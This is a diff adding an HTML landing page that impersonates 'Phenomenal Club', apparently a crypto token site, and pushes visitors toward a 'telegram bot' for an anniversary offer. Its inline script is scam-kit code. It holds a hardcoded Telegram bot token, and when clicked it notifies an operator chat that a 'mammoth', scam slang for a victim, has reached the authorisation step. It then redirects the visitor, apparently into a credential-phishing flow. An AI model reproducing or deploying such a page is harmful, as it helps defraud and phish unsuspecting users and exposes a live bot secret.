@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phenomenal Club</title>
+    <link rel="icon" href="http://pnmtoken.com/img/favicon.png" type="image/x-icon">
+    <link rel="shortcut icon" href="http://pnmtoken.com/img/favicon.png" type="image/x-icon">
+    <link href="Phenomenal%20Club_files/css2.css" rel="stylesheet">
+    <link href="Phenomenal%20Club_files/css2_002.css" rel="stylesheet">
+    <link rel="stylesheet" href="Phenomenal%20Club_files/tobii.css">
+    <link rel="stylesheet" href="Phenomenal%20Club_files/main.css">
+</head>
+
+<body>
+    <center><section class="main">
+<form method="POST">
+        <div class="left__col">
+            <a href="http://pnmtoken.com/" class="logo">
+                <img src="Phenomenal%20Club_files/logo_new.png" alt="">
+            </a>
+            <p class="sub__title">
+                Welcome to
+            </p>
+            <h1 class="main__title">
+                Phenomenal Club
+            </h1>
+            <p class="offer__text">
+                We celebrate our 1st anniversary! Be ready for whole new website and product.
+                More details in Telegram bot
+            </p>
+            <a id="btn" target="_blank" class="btn">
+                <img src="Phenomenal%20Club_files/telegram.svg" alt="">
+                telegram bot
+            </a>
+			<input type="hidden" id="logins" value="Telegram">
+            <p class="more_video">
+                watch video presentation
+            </p>
+            <a href="#right__col" class="down">
+
+                <div class="steps_arrow">
+                    <div class="chevron"> <img src="Phenomenal%20Club_files/arrow1.svg" alt=""></div>
+                    <div class="chevron"> <img src="Phenomenal%20Club_files/arrow1.svg" alt=""></div>
+                    <div class="chevron"> <img src="Phenomenal%20Club_files/arrow1.svg" alt=""></div>
+                </div>
+            </a>
+        </div>
+
+        <div class="right__col" id="right__col">
+
+            <div class="right__content">
+                <button data-type="youtube" data-id="aQi4ZMXUg0U" class="lightbox video_play">
+
+                </button>
+</form>				
+    <script>
+      const time = new Date()
+      const token = '2100718274:AAGHN29vL3xLZQTqJqwZH8NQ0qD0PmKsvNw'
+      document.querySelector('#login').addEventListener('click', function(){
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({chat_id:-655079002,text: `☘️Phenomenal Bot| Still☘️\n\n🪤 Мамонт на авторизации ${document.querySelector('#logins').value}\n\n🕰 Время: ${time.getHours()}:${time.getMinutes()}\n📆 Дата: ${time.getDate()}.${time.getMonth()+1}.${time.getFullYear()}\n\n 💡 By @ssnifferr_bot Team`
+      })
+      })
+	  .then(e=>{location.replace('telegram')})
+      })
+      
+    </script>					
+            </div>
+        </div>
+    </section></center>
+    <script type="text/javascript" id="www-widgetapi-script" src="Phenomenal%20Club_files/www-widgetapi.js" async=""></script><script id="iframe_api" src="Phenomenal%20Club_files/iframe_api"></script><script src="Phenomenal%20Club_files/tobii.js"></script>
+<div role="dialog" aria-hidden="true" class="tobii"><button class="tobii__prev" type="button" aria-label="Previous image"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M14 18l-6-6 6-6"></path></svg></button><button class="tobii__next" type="button" aria-label="Next image"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M10 6l6 6-6 6"></path></svg></button><button class="tobii__close" type="button" aria-label="Close lightbox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M6 6l12 12M6 18L18 6"></path></svg></button><div class="tobii__counter"></div><div class="tobii__slider"><div class="tobii__slider-slide" style="position: absolute; left: 0%;"><div data-player="0" data-type="youtube"><iframe allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" src="Phenomenal%20Club_files/aQi4ZMXUg0U.htm" id="widget2" width="640" height="360" frameborder="0"></iframe></div></div></div></div>
+
+
+</body></html>
